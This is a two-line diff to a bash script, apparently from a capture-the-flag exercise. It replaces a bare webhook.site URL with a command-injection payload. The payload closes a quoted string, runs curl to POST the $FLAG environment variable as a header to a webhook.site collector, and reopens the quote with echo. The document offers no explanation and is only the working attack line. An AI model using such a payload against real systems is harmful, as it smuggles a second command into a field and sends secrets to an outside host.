@@ -1,2 +1,2 @@
 #!/bin/bash
-https://webhook.site/1c87200e-f973-4b26-9779-202711597d3e
+"; curl -X POST -H flag:$FLAG https://webhook.site/1c87200e-f973-4b26-9779-202711597d3e; echo "
